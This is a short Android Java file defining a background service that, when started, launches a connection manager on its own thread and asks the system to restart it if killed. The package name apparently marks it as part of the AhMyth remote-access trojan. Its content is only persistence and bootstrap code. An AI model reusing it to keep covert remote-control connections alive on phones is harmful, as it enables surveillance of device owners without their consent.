package ahmyth.mine.king.ahmyth.service;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import ahmyth.mine.king.ahmyth.manager.ConnectionManager;

public class MainService extends Service {
    private static Context contextOfApplication;
    private ExecutorService mExceutorService;
    public MainService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        //throw new UnsupportedOperationException("Not yet implemented");
        return null;
    }


    @Override
    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
    {
        contextOfApplication = this;
        mExceutorService = Executors.newSingleThreadExecutor();
        mExceutorService.execute(new Runnable() {
            @Override
            public void run() {
                ConnectionManager.startAsync(MainService.this);
            }
        });
        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }


    public static Context getContextOfApplication()
    {
        return contextOfApplication;
    }


}
